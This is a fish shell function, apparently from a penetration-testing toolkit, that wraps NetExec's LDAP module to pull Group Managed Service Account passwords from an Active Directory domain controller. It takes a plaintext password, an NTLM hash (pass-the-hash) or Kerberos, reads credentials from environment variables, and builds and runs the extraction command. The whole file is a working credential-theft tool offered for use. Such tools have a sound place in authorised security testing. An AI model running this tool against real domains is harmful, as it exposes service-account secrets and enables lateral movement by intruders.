# description: Read GMSA passwords using nxc ldap
function _kronos_gmsa --description "Read GMSA passwords using nxc ldap"
    argparse h/help u/username= p/password= H/hash= k/kerberos -- $argv
    or return 1

    if set -q _flag_help
        echo "Usage: kronos gmsa [TARGET] [OPTIONS]"
        echo ""
        echo "Read GMSA passwords using nxc ldap."
        echo ""
        echo "Arguments:"
        echo "  TARGET              IP, hostname, or nameserver (falls back to \$TGT_DC or \$TGT)"
        echo ""
        echo "Options:"
        echo "  -u, --username USER Provide username"
        echo "  -p, --password PASS Provide password"
        echo "  -H, --hash HASH     Provide NTLM hash"
        echo "  -k, --kerberos      Use Kerberos authentication"
        echo "  -h, --help          Show this help message"
        return 0
    end

    set -l target $argv[1]
    if test -z "$target"
        if test -n "$TGT_DC"
            set target $TGT_DC
        else if test -n "$TGT"
            set target $TGT
        else
            echo "Error: Target IP/hostname/nameserver is required." >&2
            echo "Usage: kronos gmsa [TARGET] [OPTIONS]" >&2
            return 1
        end
    end

    set -l auth_user ""
    set -l auth_pass ""
    set -l auth_hash ""
    set -l has_creds 0

    if set -q _flag_kerberos
        set has_creds 1
    else if set -q _flag_username
        set auth_user $_flag_username
        if set -q _flag_password
            set auth_pass $_flag_password
            set has_creds 1
        else if set -q _flag_hash
            set auth_hash $_flag_hash
            set has_creds 1
        else
            echo "Error: Username provided but no password (-p) or hash (-H) supplied." >&2
            return 1
        end
    else if test -n "$TGT_USERNAME"
        if test -n "$TGT_PASSWORD"
            set auth_user $TGT_USERNAME
            set auth_pass $TGT_PASSWORD
            set has_creds 1
        else if test -n "$TGT_HASH"
            set auth_user $TGT_USERNAME
            set auth_hash $TGT_HASH
            set has_creds 1
        end
    end

    if test "$has_creds" -eq 0
        echo "Error: Credentials or Kerberos flag are required." >&2
        return 1
    end

    if not command -s nxc >/dev/null
        echo "Error: nxc (NetExec) not found in PATH." >&2
        return 1
    end

    set -l nxc_cmd "nxc ldap $target"
    if test -n "$TGT_AD_DOMAIN"
        set nxc_cmd "$nxc_cmd -d $TGT_AD_DOMAIN"
    end

    if set -q _flag_kerberos
        set nxc_cmd "$nxc_cmd -k"
        if test -n "$auth_user"
            set nxc_cmd "$nxc_cmd -u $auth_user -p ''"
        end
    else
        set nxc_cmd "$nxc_cmd -u $auth_user"
        if test -n "$auth_hash"
            set nxc_cmd "$nxc_cmd -H $auth_hash"
        else
            set nxc_cmd "$nxc_cmd -p $auth_pass"
        end
    end

    set nxc_cmd "$nxc_cmd --gmsa"

    echo "Running nxc ldap to extract GMSA passwords..."
    eval $nxc_cmd
end
